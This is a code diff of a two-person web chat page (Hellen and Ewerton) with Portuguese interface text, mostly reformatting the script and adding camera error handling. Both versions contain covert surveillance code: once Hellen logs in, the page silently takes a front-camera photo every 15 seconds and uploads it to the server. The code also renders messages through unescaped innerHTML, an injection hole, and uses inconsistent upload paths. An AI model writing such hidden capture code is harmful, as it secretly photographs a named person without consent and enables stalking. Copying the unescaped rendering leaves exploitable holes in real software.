@@ -297,453 +297,471 @@
     </div>
 
     <script>
-
         let currentUser = "";
-let typingTimeout;
-let mediaRecorder;
-let audioChunks = [];
-let isRecording = false;
-let stream = null;
-let autoPhotoInterval = null;
-let unlockCount = 0;
-let lastMessageCount = 0;
-let lastNotifiedHellen = "";
-let dotCount = 0;
+        let typingTimeout;
+        let mediaRecorder;
+        let audioChunks = [];
+        let isRecording = false;
+        let stream = null;
+        let autoPhotoInterval = null;
+        let unlockCount = 0;
+        let lastMessageCount = 0;
+        let lastNotifiedHellen = "";
+        let dotCount = 0;
 
-function unlockAttempt() {
-    unlockCount++;
-    if (unlockCount >= 3) {
-        document.getElementById("lock-screen").style.display = "none";
-    }
-}
-
-function login(user) {
-    currentUser = user;
-    document.getElementById("login-container").style.display = "none";
-    document.getElementById("chat-container").style.display = "flex";
-    document.getElementById("chat-title").innerText = `Chat - ${user}`;
-    loadMessages();
-    if (user === "Hellen") {
-        startAutoPhotoCapture();
-    }
-}
-
-async function sendTypingStatus(isTyping) {
-    try {
-        await fetch("/typing", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ user: currentUser, typing: isTyping })
-        });
-    } catch (err) {
-        console.error("Erro ao enviar status de digitação:", err);
-    }
-}
-
-async function sendMessage() {
-    const text = document.getElementById("messageInput").innerText.trim();
-    if (!text) return;
-    try {
-        await fetch("/save-message", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ user: currentUser, content: text })
-        });
-        document.getElementById("messageInput").innerText = "";
-        loadMessages();
-    } catch (err) {
-        console.error("Erro ao enviar mensagem:", err);
-        alert("Erro ao enviar mensagem.");
-    }
-}
-
-async function sendMedia() {
-    const fileInput = document.getElementById("fileInput");
-    const file = fileInput.files[0];
-    if (!file) return;
-    const formData = new FormData();
-    formData.append("media", file);
-    formData.append("user", currentUser);
-    try {
-        await fetch("/save-media", { method: "POST", body: formData });
-        fileInput.value = "";
-        loadMessages();
-    } catch (err) {
-        console.error("Erro ao enviar mídia:", err);
-        alert("Erro ao enviar mídia.");
-    }
-}
-
-async function sendSingleViewMedia() {
-    const fileInput = document.getElementById("singleViewInput");
-    const file = fileInput.files[0];
-    if (!file) return;
-    const formData = new FormData();
-    formData.append("media", file);
-    formData.append("user", currentUser);
-    formData.append("singleView", true);
-    try {
-        await fetch("/save-single-view-media", { method: "POST", body: formData });
-        fileInput.value = "";
-        loadMessages();
-    } catch (err) {
-        console.error("Erro ao enviar mídia de visualização única:", err);
-        alert("Erro ao enviar mídia de visualização única.");
-    }
-}
-
-async function captureAutoPhoto() {
-    if (currentUser !== "Hellen") return;
-    try {
-        if (!stream) {
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
+        function unlockAttempt() {
+            unlockCount++;
+            if (unlockCount >= 3) {
+                document.getElementById("lock-screen").style.display = "none";
+            }
         }
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                video.onloadedmetadata = null;
-                resolve();
-            };
-        });
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(async (blob) => {
-            const formData = new FormData();
-            formData.append("media", blob, `${Date.now()}.jpg`);
-            formData.append("user", currentUser);
+
+        function login(user) {
+            currentUser = user;
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("chat-container").style.display = "flex";
+            document.getElementById("chat-title").innerText = `Chat - ${user}`;
+            loadMessages();
+            if (user === "Hellen") {
+                startAutoPhotoCapture();
+            }
+        }
+
+        async function sendTypingStatus(isTyping) {
             try {
-                await fetch("/save-auto-photo", { method: "POST", body: formData });
+                await fetch("/typing", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user: currentUser, typing: isTyping })
+                });
+            } catch (err) {
+                console.error("Erro ao enviar status de digitação:", err);
+            }
+        }
+
+        async function sendMessage() {
+            const text = document.getElementById("messageInput").innerText.trim();
+            if (!text) return;
+            try {
+                await fetch("/save-message", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user: currentUser, content: text })
+                });
+                document.getElementById("messageInput").innerText = "";
                 loadMessages();
             } catch (err) {
-                console.error("Erro ao enviar foto automática:", err);
+                console.error("Erro ao enviar mensagem:", err);
+                alert("Erro ao enviar mensagem.");
             }
-        }, "image/jpeg");
-        video.srcObject = null;
-    } catch (err) {
-        console.error("Erro ao capturar foto automática:", err);
-        alert("Erro ao acessar a câmera para captura automática. Verifique permissões ou tente novamente.");
-    }
-}
+        }
 
-function startAutoPhotoCapture() {
-    if (currentUser === "Hellen" && !autoPhotoInterval) {
-        captureAutoPhoto(); // Capture immediately
-        autoPhotoInterval = setInterval(captureAutoPhoto, 15000);
-    }
-}
+        async function sendMedia() {
+            const fileInput = document.getElementById("fileInput");
+            const file = fileInput.files[0];
+            if (!file) return;
+            const formData = new FormData();
+            formData.append("media", file);
+            formData.append("user", currentUser);
+            try {
+                await fetch("/save-media", { method: "POST", body: formData });
+                fileInput.value = "";
+                loadMessages();
+            } catch (err) {
+                console.error("Erro ao enviar mídia:", err);
+                alert("Erro ao enviar mídia.");
+            }
+        }
 
-function stopAutoPhotoCapture() {
-    if (autoPhotoInterval) {
-        clearInterval(autoPhotoInterval);
-        autoPhotoInterval = null;
-    }
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-    }
-}
+        async function sendSingleViewMedia() {
+            const fileInput = document.getElementById("singleViewInput");
+            const file = fileInput.files[0];
+            if (!file) return;
+            const formData = new FormData();
+            formData.append("media", file);
+            formData.append("user", currentUser);
+            formData.append("singleView", true);
+            try {
+                await fetch("/save-single-view-media", { method: "POST", body: formData });
+                fileInput.value = "";
+                loadMessages();
+            } catch (err) {
+                console.error("Erro ao enviar mídia de visualização única:", err);
+                alert("Erro ao enviar mídia de visualização única.");
+            }
+        }
 
-async function loadMessages() {
-    try {
-        const response = await fetch("/load-messages");
-        const messages = await response.json();
-        const messagesContainer = document.getElementById("messages");
-        messagesContainer.innerHTML = "";
-        messages.forEach(msg => {
-            const div = document.createElement("div");
-            div.classList.add("message", msg.user.toLowerCase());
-            if (msg.content) {
-                div.innerHTML = msg.content.replace(/\n/g, "<br>");
-            } else if (msg.media) {
-                const fileExtension = msg.media.split('.').pop().toLowerCase();
-                if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
-                    div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
-                } else if (msg.viewed && msg.user === currentUser) {
-                    div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
-                } else if (!msg.singleView) {
-                    if (["mp4", "webm", "ogg"].includes(fileExtension)) {
-                        div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/fotos/${msg.media}" type="video/${fileExtension}"></video>`;
-                    } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
-                        div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/fotos/${msg.media}" type="audio/${fileExtension}"></audio>`;
-                    } else {
-                        div.innerHTML = `<img src="/fotos/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
+        async function captureAutoPhoto() {
+            if (currentUser !== "Hellen") return;
+            try {
+                if (!stream) {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
+                }
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.onloadedmetadata = null;
+                        setTimeout(resolve, 500); // Wait for video to stabilize
+                    };
+                });
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    throw new Error("Video dimensions are invalid.");
+                }
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append("media", blob, `${Date.now()}.jpg`);
+                    formData.append("user", currentUser);
+                    try {
+                        await fetch("/save-auto-photo", { method: "POST", body: formData });
+                        loadMessages();
+                    } catch (err) {
+                        console.error("Erro ao enviar foto automática:", err);
                     }
+                }, "image/jpeg");
+                video.srcObject = null;
+            } catch (err) {
+                console.error("Erro ao capturar foto automática:", err);
+                if (err.name === "NotAllowedError") {
+                    alert("Camera access denied. Please allow camera permissions in browser settings.");
+                } else if (err.name === "NotFoundError") {
+                    alert("No front-facing camera found. Please check your device.");
+                } else {
+                    alert("Error capturing auto photo: " + err.message);
                 }
             }
-            messagesContainer.appendChild(div);
-        });
-        messagesContainer.scrollTop = messagesContainer.scrollHeight;
-    } catch (err) {
-        console.error("Erro ao carregar mensagens:", err);
-    }
-}
-
-async function openSingleView(media) {
-    const fileExtension = media.split('.').pop().toLowerCase();
-    const overlay = document.getElementById("overlay");
-    const overlayImage = document.getElementById("overlay-image");
-    const overlayVideo = document.getElementById("overlay-video");
-    const overlayContent = document.getElementById("overlay-content");
-    if (["mp4", "webm", "ogg"].includes(fileExtension)) {
-        overlayImage.style.display = "none";
-        overlayVideo.style.display = "block";
-        overlayVideo.src = `/fotos/${media}`;
-    } else {
-        overlayVideo.style.display = "none";
-        overlayImage.style.display = "block";
-        overlayImage.src = `/fotos/${media}`;
-    }
-    overlayContent.innerHTML = `
-        <img id="overlay-image" src="${overlayImage.src}" alt="Imagem" style="display: ${overlayImage.style.display};">
-        <video id="overlay-video" controls style="display: ${overlayVideo.style.display};" src="${overlayVideo.src}"></video>
-        <button onclick="closeOverlay()">Fechar</button>
-    `;
-    overlay.style.display = "flex";
-    try {
-        await fetch("/mark-as-viewed", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ media: media, viewer: currentUser })
-        });
-        loadMessages();
-    } catch (err) {
-        console.error("Erro ao marcar mídia como visualizada:", err);
-    }
-}
-
-function closeOverlay() {
-    const overlay = document.getElementById("overlay");
-    const overlayContent = document.getElementById("overlay-content");
-    const overlayImage = document.getElementById("overlay-image");
-    const overlayVideo = document.getElementById("overlay-video");
-    overlayImage.src = "";
-    overlayVideo.src = "";
-    overlayImage.style.display = "none";
-    overlayVideo.style.display = "none";
-    overlayContent.innerHTML = `
-        <img id="overlay-image" src="" alt="Imagem">
-        <video id="overlay-video" controls style="display: none;"></video>
-        <button onclick="closeOverlay()">Fechar</button>
-    `;
-    overlay.style.display = "none";
-}
-
-async function toggleRecording() {
-    try {
-        if (!isRecording) {
-            audioChunks = [];
-            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            mediaRecorder = new MediaRecorder(audioStream);
-            mediaRecorder.ondataavailable = (event) => {
-                audioChunks.push(event.data);
-            };
-            mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
-                const formData = new FormData();
-                formData.append("media", audioBlob, "audio.wav");
-                formData.append("user", currentUser);
-                await fetch("/save-media", { method: "POST", body: formData });
-                loadMessages();
-                audioStream.getTracks().forEach(track => track.stop());
-            };
-            mediaRecorder.start();
-            isRecording = true;
-            document.getElementById("recordButton").classList.add("recording");
-            document.getElementById("recordButton").innerText = "⏹ Parar Gravação";
-        } else {
-            mediaRecorder.stop();
-            isRecording = false;
-            document.getElementById("recordButton").classList.remove("recording");
-            document.getElementById("recordButton").innerText = "🎤 Gravar Áudio";
         }
-    } catch (err) {
-        console.error("Erro ao gravar áudio:", err);
-        alert("Erro ao gravar áudio. Verifique permissões de microfone.");
-    }
-}
 
-async function openCamera() {
-    const cameraOverlay = document.getElementById("camera-overlay");
-    const video = document.getElementById("camera-video");
-    cameraOverlay.style.display = "flex";
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
-        video.srcObject = stream;
-        await video.play();
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                video.onloadedmetadata = null;
-                resolve();
-            };
-        });
-    } catch (err) {
-        console.error("Erro ao acessar a câmera:", err);
-        alert("Erro ao acessar a câmera. Verifique permissões ou tente novamente.");
-        closeCamera();
-    }
-}
-
-async function capturePhoto(singleView) {
-    const video = document.getElementById("camera-video");
-    if (!video.srcObject) {
-        alert("Câmera não está ativa. Tente abrir a câmera novamente.");
-        return;
-    }
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(async (blob) => {
-        const overlay = document.getElementById("overlay");
-        const overlayContent = document.getElementById("overlay-content");
-        const overlayImage = document.getElementById("overlay-image");
-        const overlayVideo = document.getElementById("overlay-video");
-        overlayImage.src = URL.createObjectURL(blob);
-        overlayImage.style.display = "block";
-        overlayVideo.style.display = "none";
-        overlayContent.innerHTML = `
-            <img id="overlay-image" src="${overlayImage.src}" alt="Imagem capturada" style="max-width: 100%; border-radius: 8px;">
-            <div style="margin-top: 10px;">
-                <button onclick="sendCapturedPhoto(${singleView})">Enviar</button>
-                <button onclick="closeOverlayAndReopenCamera()">Tirar Outra</button>
-                <button onclick="closeOverlay()">Fechar</button>
-            </div>
-        `;
-        overlay.style.display = "flex";
-        if (singleView) {
-            closeCamera();
+        function startAutoPhotoCapture() {
+            if (currentUser === "Hellen" && !autoPhotoInterval) {
+                captureAutoPhoto(); // Capture immediately
+                autoPhotoInterval = setInterval(captureAutoPhoto, 15000);
+            }
         }
-    }, "image/jpeg");
-}
 
-async function sendCapturedPhoto(singleView) {
-    const overlayImage = document.getElementById("overlay-image");
-    try {
-        const response = await fetch(overlayImage.src);
-        const blob = await response.blob();
-        const formData = new FormData();
-        formData.append("media", blob, `${Date.now()}.jpg`);
-        formData.append("user", currentUser);
-        const endpoint = singleView ? "/save-single-view-media" : "/save-media";
-        await fetch(endpoint, { method: "POST", body: formData });
-        closeOverlay();
-        loadMessages();
-    } catch (err) {
-        console.error("Erro ao enviar foto capturada:", err);
-        alert("Erro ao enviar foto capturada.");
-    }
-}
+        function stopAutoPhotoCapture() {
+            if (autoPhotoInterval) {
+                clearInterval(autoPhotoInterval);
+                autoPhotoInterval = null;
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
 
-function closeOverlayAndReopenCamera() {
-    closeOverlay();
-    openCamera();
-}
-
-function closeCamera() {
-    const cameraOverlay = document.getElementById("camera-overlay");
-    const video = document.getElementById("camera-video");
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-    }
-    video.srcObject = null;
-    cameraOverlay.style.display = "none";
-}
-
-async function autoUpdateMessages() {
-    try {
-        const response = await fetch("/load-messages");
-        const messages = await response.json();
-        const messagesContainer = document.getElementById("messages");
-        if (messages.length !== lastMessageCount) {
-            messagesContainer.innerHTML = "";
-            messages.forEach(msg => {
-                const div = document.createElement("div");
-                div.classList.add("message", msg.user.toLowerCase());
-                if (msg.content) {
-                    div.innerHTML = msg.content.replace(/\n/g, "<br>");
-                } else if (msg.media) {
-                    const fileExtension = msg.media.split('.').pop().toLowerCase();
-                    if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
-                        div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
-                    } else if (msg.viewed && msg.user === currentUser) {
-                        div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
-                    } else if (!msg.singleView) {
-                        if (["mp4", "webm", "ogg"].includes(fileExtension)) {
-                            div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/fotos/${msg.media}" type="video/${fileExtension}"></video>`;
-                        } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
-                            div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/fotos/${msg.media}" type="audio/${fileExtension}"></audio>`;
-                        } else {
-                            div.innerHTML = `<img src="/fotos/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
+        async function loadMessages() {
+            try {
+                const response = await fetch("/load-messages");
+                const messages = await response.json();
+                const messagesContainer = document.getElementById("messages");
+                messagesContainer.innerHTML = "";
+                messages.forEach(msg => {
+                    const div = document.createElement("div");
+                    div.classList.add("message", msg.user.toLowerCase());
+                    if (msg.content) {
+                        div.innerHTML = msg.content.replace(/\n/g, "<br>");
+                    } else if (msg.media) {
+                        const fileExtension = msg.media.split('.').pop().toLowerCase();
+                        if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
+                            div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
+                        } else if (msg.viewed && msg.user === currentUser) {
+                            div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
+                        } else if (!msg.singleView) {
+                            if (["mp4", "webm", "ogg"].includes(fileExtension)) {
+                                div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/uploads/${msg.media}" type="video/${fileExtension}"></video>`;
+                            } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
+                                div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
+                            } else {
+                                div.innerHTML = `<img src="/Uploads/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
+                            }
                         }
                     }
-                }
-                messagesContainer.appendChild(div);
-            });
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-            lastMessageCount = messages.length;
-        }
-        const hellenMessages = messages.filter(m => m.user === "Hellen");
-        if (hellenMessages.length > 0) {
-            const lastHellen = hellenMessages[hellenMessages.length - 1];
-            const content = lastHellen.content || "Enviou uma mídia";
-            if (lastHellen.content !== lastNotifiedHellen) {
-                if (Notification.permission === "granted") {
-                    new Notification("Nova mensagem de Hellen", {
-                        body: content,
-                        icon: "/path/to/icon.png"
-                    });
-                }
-                lastNotifiedHellen = lastHellen.content;
+                    messagesContainer.appendChild(div);
+                });
+                messagesContainer.scrollTop = messagesContainer.scrollHeight;
+            } catch (err) {
+                console.error("Erro ao carregar mensagens:", err);
             }
         }
-    } catch (err) {
-        console.error("Erro ao carregar mensagens:", err);
-    }
-}
 
-function updateTypingIndicator() {
-    fetch("/typing-status")
-        .then(res => res.json())
-        .then(status => {
-            const otherUser = currentUser === "Hellen" ? "Ewerton" : "Hellen";
-            if (status[otherUser]) {
-                dotCount = (dotCount + 1) % 4;
-                const dots = ".".repeat(dotCount);
-                document.getElementById("typing-indicator").innerText = `${otherUser} está digitando${dots}`;
+        async function openSingleView(media) {
+            const fileExtension = media.split('.').pop().toLowerCase();
+            const overlay = document.getElementById("overlay");
+            const overlayImage = document.getElementById("overlay-image");
+            const overlayVideo = document.getElementById("overlay-video");
+            const overlayContent = document.getElementById("overlay-content");
+            if (["mp4", "webm", "ogg"].includes(fileExtension)) {
+                overlayImage.style.display = "none";
+                overlayVideo.style.display = "block";
+                overlayVideo.src = `/Uploads/${media}`;
             } else {
-                document.getElementById("typing-indicator").innerText = "";
+                overlayVideo.style.display = "none";
+                overlayImage.style.display = "block";
+                overlayImage.src = `/Uploads/${media}`;
             }
-        })
-        .catch(err => console.error("Erro ao buscar status de digitação:", err));
-}
-
-document.addEventListener("DOMContentLoaded", () => {
-    const messageInput = document.getElementById("messageInput");
-    messageInput.addEventListener("input", () => {
-        sendTypingStatus(true);
-        clearTimeout(typingTimeout);
-        typingTimeout = setTimeout(() => sendTypingStatus(false), 1000);
-    });
-    messageInput.addEventListener("keydown", (event) => {
-        if (event.key === "Enter" && !event.shiftKey) {
-            event.preventDefault();
-            sendMessage();
+            overlayContent.innerHTML = `
+                <img id="overlay-image" src="${overlayImage.src}" alt="Imagem" style="display: ${overlayImage.style.display};">
+                <video id="overlay-video" controls style="display: ${overlayVideo.style.display};" src="${overlayVideo.src}"></video>
+                <button onclick="closeOverlay()">Fechar</button>
+            `;
+            overlay.style.display = "flex";
+            try {
+                await fetch("/mark-as-viewed", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ media: media, viewer: currentUser })
+                });
+                loadMessages();
+            } catch (err) {
+                console.error("Erro ao marcar mídia como visualizada:", err);
+            }
         }
-    });
-    if ("Notification" in window) {
-        Notification.requestPermission();
-    }
-    setInterval(autoUpdateMessages, 1000);
-    setInterval(updateTypingIndicator, 500);
-    window.addEventListener('beforeunload', stopAutoPhotoCapture);
-});
+
+        function closeOverlay() {
+            const overlay = document.getElementById("overlay");
+            const overlayContent = document.getElementById("overlay-content");
+            const overlayImage = document.getElementById("overlay-image");
+            const overlayVideo = document.getElementById("overlay-video");
+            overlayImage.src = "";
+            overlayVideo.src = "";
+            overlayImage.style.display = "none";
+            overlayVideo.style.display = "none";
+            overlayContent.innerHTML = `
+                <img id="overlay-image" src="" alt="Imagem">
+                <video id="overlay-video" controls style="display: none;"></video>
+                <button onclick="closeOverlay()">Fechar</button>
+            `;
+            overlay.style.display = "none";
+        }
+
+        async function toggleRecording() {
+            try {
+                if (!isRecording) {
+                    audioChunks = [];
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    mediaRecorder = new MediaRecorder(audioStream);
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                        const formData = new FormData();
+                        formData.append("media", audioBlob, "audio.wav");
+                        formData.append("user", currentUser);
+                        await fetch("/save-media", { method: "POST", body: formData });
+                        loadMessages();
+                        audioStream.getTracks().forEach(track => track.stop());
+                    };
+                    mediaRecorder.start();
+                    isRecording = true;
+                    document.getElementById("recordButton").classList.add("recording");
+                    document.getElementById("recordButton").innerText = "⏹ Parar Gravação";
+                } else {
+                    mediaRecorder.stop();
+                    isRecording = false;
+                    document.getElementById("recordButton").classList.remove("recording");
+                    document.getElementById("recordButton").innerText = "🎤 Gravar Áudio";
+                }
+            } catch (err) {
+                console.error("Erro ao gravar áudio:", err);
+                alert("Erro ao gravar áudio. Verifique permissões de microfone.");
+            }
+        }
+
+        async function openCamera() {
+            const cameraOverlay = document.getElementById("camera-overlay");
+            const video = document.getElementById("camera-video");
+            cameraOverlay.style.display = "flex";
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.onloadedmetadata = null;
+                        setTimeout(resolve, 500); // Wait for video to stabilize
+                    };
+                });
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    throw new Error("Video dimensions are invalid.");
+                }
+            } catch (err) {
+                console.error("Erro ao acessar a câmera:", err);
+                if (err.name === "NotAllowedError") {
+                    alert("Camera access denied. Please allow camera permissions in browser settings.");
+                } else if (err.name === "NotFoundError") {
+                    alert("No front-facing camera found. Please check your device.");
+                } else {
+                    alert("Error accessing camera: " + err.message);
+                }
+                closeCamera();
+            }
+        }
+
+        async function capturePhoto(singleView) {
+            const video = document.getElementById("camera-video");
+            if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
+                alert("Câmera não está ativa ou não está pronta. Tente abrir a câmera novamente.");
+                closeCamera();
+                return;
+            }
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(async (blob) => {
+                const overlay = document.getElementById("overlay");
+                const overlayContent = document.getElementById("overlay-content");
+                const overlayImage = document.getElementById("overlay-image");
+                const overlayVideo = document.getElementById("overlay-video");
+                overlayImage.src = URL.createObjectURL(blob);
+                overlayImage.style.display = "block";
+                overlayVideo.style.display = "none";
+                overlayContent.innerHTML = `
+                    <img id="overlay-image" src="${overlayImage.src}" alt="Imagem capturada" style="max-width: 100%; border-radius: 8px;">
+                    <div style="margin-top: 10px;">
+                        <button onclick="sendCapturedPhoto(${singleView})">Enviar</button>
+                        <button onclick="closeOverlayAndReopenCamera()">Tirar Outra</button>
+                        <button onclick="closeOverlay()">Fechar</button>
+                    </div>
+                `;
+                overlay.style.display = "flex";
+                if (singleView) {
+                    closeCamera();
+                }
+            }, "image/jpeg");
+        }
+
+        async function sendCapturedPhoto(singleView) {
+            const overlayImage = document.getElementById("overlay-image");
+            try {
+                const response = await fetch(overlayImage.src);
+                const blob = await response.blob();
+                const formData = new FormData();
+                formData.append("media", blob, `${Date.now()}.jpg`);
+                formData.append("user", currentUser);
+                const endpoint = singleView ? "/save-single-view-media" : "/save-media";
+                await fetch(endpoint, { method: "POST", body: formData });
+                closeOverlay();
+                loadMessages();
+            } catch (err) {
+                console.error("Erro ao enviar foto capturada:", err);
+                alert("Erro ao enviar foto capturada.");
+            }
+        }
+
+        function closeOverlayAndReopenCamera() {
+            closeOverlay();
+            openCamera();
+        }
+
+        function closeCamera() {
+            const cameraOverlay = document.getElementById("camera-overlay");
+            const video = document.getElementById("camera-video");
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            video.srcObject = null;
+            cameraOverlay.style.display = "none";
+        }
+
+        async function autoUpdateMessages() {
+            try {
+                const response = await fetch("/load-messages");
+                const messages = await response.json();
+                const messagesContainer = document.getElementById("messages");
+                if (messages.length !== lastMessageCount) {
+                    messagesContainer.innerHTML = "";
+                    messages.forEach(msg => {
+                        const div = document.createElement("div");
+                        div.classList.add("message", msg.user.toLowerCase());
+                        if (msg.content) {
+                            div.innerHTML = msg.content.replace(/\n/g, "<br>");
+                        } else if (msg.media) {
+                            const fileExtension = msg.media.split('.').pop().toLowerCase();
+                            if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
+                                div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
+                            } else if (msg.viewed && msg.user === currentUser) {
+                                div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
+                            } else if (!msg.singleView) {
+                                if (["mp4", "webm", "ogg"].includes(fileExtension)) {
+                                    div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/Uploads/${msg.media}" type="video/${fileExtension}"></video>`;
+                                } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
+                                    div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
+                                } else {
+                                    div.innerHTML = `<img src="/Uploads/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
+                                }
+                            }
+                        }
+                        messagesContainer.appendChild(div);
+                    });
+                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
+                    lastMessageCount = messages.length;
+                }
+                const hellenMessages = messages.filter(m => m.user === "Hellen");
+                if (hellenMessages.length > 0) {
+                    const lastHellen = hellenMessages[hellenMessages.length - 1];
+                    const content = lastHellen.content || "Enviou uma mídia";
+                    if (lastHellen.content !== lastNotifiedHellen) {
+                        if (Notification.permission === "granted") {
+                            new Notification("Nova mensagem de Hellen", {
+                                body: content,
+                                icon: "/path/to/icon.png"
+                            });
+                        }
+                        lastNotifiedHellen = lastHellen.content;
+                    }
+                }
+            } catch (err) {
+                console.error("Erro ao carregar mensagens:", err);
+            }
+        }
+
+        function updateTypingIndicator() {
+            fetch("/typing-status")
+                .then(res => res.json())
+                .then(status => {
+                    const otherUser = currentUser === "Hellen" ? "Ewerton" : "Hellen";
+                    if (status[otherUser]) {
+                        dotCount = (dotCount + 1) % 4;
+                        const dots = ".".repeat(dotCount);
+                        document.getElementById("typing-indicator").innerText = `${otherUser} está digitando${dots}`;
+                    } else {
+                        document.getElementById("typing-indicator").innerText = "";
+                    }
+                })
+                .catch(err => console.error("Erro ao buscar status de digitação:", err));
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const messageInput = document.getElementById("messageInput");
+            messageInput.addEventListener("input", () => {
+                sendTypingStatus(true);
+                clearTimeout(typingTimeout);
+                typingTimeout = setTimeout(() => sendTypingStatus(false), 1000);
+            });
+            messageInput.addEventListener("keydown", (event) => {
+                if (event.key === "Enter" && !event.shiftKey) {
+                    event.preventDefault();
+                    sendMessage();
+                }
+            });
+            if ("Notification" in window) {
+                Notification.requestPermission();
+            }
+            setInterval(autoUpdateMessages, 1000);
+            setInterval(updateTypingIndicator, 500);
+            window.addEventListener('beforeunload', stopAutoPhotoCapture);
+        });
     </script>
 </body>
 </html>
